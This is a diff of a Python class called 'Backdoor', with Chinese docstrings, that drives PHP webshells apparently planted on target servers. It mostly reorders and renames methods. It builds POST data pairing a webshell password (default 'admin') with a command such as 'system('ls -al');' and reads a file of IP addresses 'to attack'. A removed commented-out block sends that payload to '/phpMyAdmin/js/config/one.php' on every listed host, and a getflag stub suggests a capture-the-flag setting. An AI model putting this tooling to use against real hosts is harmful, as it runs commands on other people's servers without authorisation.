@@ -16,13 +16,11 @@ class Backdoor:
     first_param_value = ''  # 查询值
     password = ''  # 连接密码
     cmd = ''  # 执行命令
-    post_data = {}
+    post_data = {}  # post数据
 
-    def readFileAddress(self):
+    def printAll(self):
         """
-        从文件中读取IP地址资产。
-
-        该方法用于从文件中读取IP地址资产列表，文件中应包含相关的IP地址，每行一个。
+        打印对象的所有属性信息。
 
         Args:
             None
@@ -30,18 +28,75 @@ class Backdoor:
         Returns:
             None
 
-        Raises:
-            Exception: 如果发生任何异常，将引发"文件地址获取发生错误"异常。
+        Example:
+            示例用法:
+            - 调用 `printAll()` 方法来打印对象的所有属性信息。
+        """
+        print("文件地址属性: ", self.FileAddress)
+        print("IP地址属性: ", self.IP_Address)
+        print("URL属性: ", self.Url)
+        print("协议部分属性: ", self.scheme)
+        print("域名部分属性: ", self.netloc)
+        print("地址部分属性: ", self.path)
+        print("查询部分属性: ", self.query)
+        print("查询键属性: ", self.first_param_name)
+        print("查询值属性: ", self.first_param_value)
+        print("连接密码属性: ", self.password)
+        print("执行命令属性: ", self.cmd)
+
+    def setCmd(self, value=""):
+        """
+        设置执行命令。
+
+        这个方法用于设置执行命令属性 `cmd` 的值。
+
+        Args:
+            value (str, optional): 要设置的执行命令。默认为空字符串。
+
+        Returns:
+            None
 
         Example:
             示例用法:
-            - 创建一个文本文件，写入要攻击的IP地址
-            - 调用 `readFileAddress()` 方法来读取这个文件地址。
+            - 调用 `setCmd()` 方法来设置执行命令属性。
         """
-        try:
-            self.FileAddress = re.sub(r"\"", "", input("输入源地址： "))
-        except Exception as e:
-            print("文件地址获取发生错误", str(e))
+        self.cmd = value
+
+    def setPassword(self, value=""):
+        """
+        设置连接密码。
+
+        这个方法用于设置连接密码属性 `password` 的值。
+
+        Args:
+            value (str, optional): 要设置的连接密码。默认为空字符串。
+
+        Returns:
+            None
+
+        Example:
+            示例用法:
+            - 调用 `setPassword()` 方法来设置连接密码属性。
+        """
+        self.password = value
+
+    def setPostValue(self):
+        """
+        设置POST请求参数。
+
+        这个方法用于设置POST请求的参数，根据对象的 `password` 和 `cmd` 属性来创建参数字典。
+
+        Args:
+            None
+
+        Returns:
+            dict: 包含POST参数的字典。
+
+        Example:
+            示例用法:
+            - 调用 `setPostValue()` 方法来创建POST请求的参数字典。
+        """
+        return {self.password: self.cmd}
 
     def testUrl(self, Url="", password="admin", automatic="y", timeoutvalue=2):
         """
@@ -67,9 +122,9 @@ class Backdoor:
             - 如果连接成功且密码正确，将保存该URL为模板。
             - 您可以使用不同的参数值来自定义测试行为，例如手动检测、更长的超时时间等。
         """
-        self.password = password
-        self.cmd = "system('ls -al');"
-        self.post_data = self.setpostvelue()
+        self.setPassword(password)
+        self.setCmd("system('ls -al');")
+        self.post_data = self.setPostValue()
         try:
             if Url == "":
                 self.Url = re.sub(r"\"", "", input("请输入链接： "))
@@ -131,9 +186,11 @@ class Backdoor:
             self.first_param_name = list(query_dict.keys())[0]
             self.first_param_value = query_dict[self.first_param_name][0]
 
-    def printAll(self):
+    def readFileAddress(self):
         """
-        打印对象的所有属性信息。
+        从文件中读取IP地址资产。
+
+        该方法用于从文件中读取IP地址资产列表，文件中应包含相关的IP地址，每行一个。
 
         Args:
             None
@@ -141,55 +198,15 @@ class Backdoor:
         Returns:
             None
 
-        Example:
-            示例用法:
-            - 调用 `printAll()` 方法来打印对象的所有属性信息。
-        """
-        print("文件地址属性: ", self.FileAddress)
-        print("IP地址属性: ", self.IP_Address)
-        print("URL属性: ", self.Url)
-        print("协议部分属性: ", self.scheme)
-        print("域名部分属性: ", self.netloc)
-        print("地址部分属性: ", self.path)
-        print("查询部分属性: ", self.query)
-        print("查询键属性: ", self.first_param_name)
-        print("查询值属性: ", self.first_param_value)
-        print("连接密码属性: ", self.password)
-        print("执行命令属性: ", self.cmd)
-
-    def setPostValue(self):
-        """
-        设置POST请求参数。
-
-        这个方法用于设置POST请求的参数，根据对象的 `password` 和 `cmd` 属性来创建参数字典。
-
-        Args:
-            None
-
-        Returns:
-            dict: 包含POST参数的字典。
+        Raises:
+            Exception: 如果发生任何异常，将引发"文件地址获取发生错误"异常。
 
         Example:
             示例用法:
-            - 调用 `setPostValue()` 方法来创建POST请求的参数字典。
+            - 创建一个文本文件，写入要攻击的IP地址
+            - 调用 `readFileAddress()` 方法来读取这个文件地址。
         """
-        return {self.password: self.cmd}
-
-
-# def gat_IP_Address(self):
-#     self.readFileAddress()
-#     with open(self.FileAddress, mode="r", encoding="utf-8") as f:
-#         for i in f.readlines():  # 读取文件的所有行
-#             url = 'http://' + i.strip()
-#             url_path = '/phpMyAdmin/js/config/one.php'
-#             try:
-#                 response = requests.post(
-#                     url + url_path, data=self.post_data, timeout=2)
-#                 response.raise_for_status()
-#             except requests.exceptions.Timeout:
-#                 print("失败：请求超时")
-#             except requests.exceptions.RequestException as e:
-#                 print("失败：", e)
-#             else:
-#                 print(response.text)
-# def getflag(self):#     # 实现获取标志的代码
+        try:
+            self.FileAddress = re.sub(r"\"", "", input("输入源地址： "))
+        except Exception as e:
+            print("文件地址获取发生错误", str(e))
